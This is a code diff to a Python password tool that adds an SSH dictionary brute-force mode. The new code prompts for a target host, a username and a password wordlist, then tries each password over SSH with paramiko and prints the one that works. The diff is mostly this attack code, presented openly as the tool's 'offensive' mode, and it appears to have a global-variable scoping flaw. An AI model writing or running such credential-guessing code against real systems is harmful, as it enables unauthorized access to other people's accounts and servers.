@@ -10,6 +10,11 @@ from rich.console import Console
 from rich.table import Table
 from tqdm import tqdm, trange
 import time
+import paramiko, sys, os, socket
+
+global host, username, line, txt_file
+
+line = "\n--------------------------------------------------\n"
 
 con = Console()
 # menu between two modes
@@ -27,7 +32,11 @@ def menu():
 
 def traffic_signal(mode):
     if mode == '1':
-        mode1()
+        d = data_collection()
+        host = d[0]
+        username = d[1]
+        txt_file = d[2]
+        mode1(host, username, txt_file)
     elif mode == '2':
         mode2()
     elif mode == '3':
@@ -50,8 +59,7 @@ def script_banner():
     print('\n')
 
 # locate wordlist and access it
-def wordlist_finder():
-    txtfile = input("Enter path to wordlist: ")
+def wordlist_finder(txtfile):
     with open(txtfile) as f:
         lines = f.readlines()
     
@@ -60,11 +68,63 @@ def wordlist_finder():
     f.close()
     return list(word_list)
 
+# 
+def data_collection():
+    try:
+        host = input("[*] Enter target host address: ")
+        username = input("[*] Enter SSH Username: ")
+        txt_file = input("[*] Enter SSH Password File: ")
+
+        if os.path.exists(txt_file) == False:
+            print ("\n[*] File Path does not exist !")
+            sys.exit(4)
+    except KeyboardInterrupt:
+        print("\n\n[*] User Requested an interrupt")
+        sys.exit(3)
+    return (host, username, txt_file)
+# 
+def ssh_connect(password, code = 0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
+    except paramiko.AuthenticationException:
+        # Authentication Failed
+        code = 1
+    except socket.error as e:
+        # Connection Failed ... Host Down
+        code = 2
+    
+    ssh.close()
+    return code
+
+# brute force path
+def brute_force(wordlist, username, host):
+    for password in wordlist:
+        try:
+            response = ssh_connect(password)
+
+            if response == 0:
+                txt = "{} User: {} Pass Found: {} {}"
+                print(txt.format(line, username, password, line))
+                sys.exit(0)
+            elif response == 1:
+                txt = "User: {} Pass: {} Login Incorrect!"
+                print(txt.format(username, password))
+            elif response == 2:
+                txt = "Connection Could not be established to address: {}"
+                print(txt.format(host))
+                sys.exit(2)
+        except Exception as e:
+            print(e)
+            pass
+
 # mode1: Offensive, Dictionary Iterator
-def mode1():
-    wordlist = wordlist_finder()
-    for word in wordlist:
-        print(word)
+def mode1(host, username, input_file):
+    wordlist = wordlist_finder(input_file)
+    brute_force(wordlist, username, host)
+
 
 # mode2: Defensive, Password Recognized
 def mode2():
@@ -119,7 +179,7 @@ def mode3():
 
 # main function
 def main():
-    script_banner()
+    #script_banner()
     while True:
         mode = menu()
         if mode in '123':
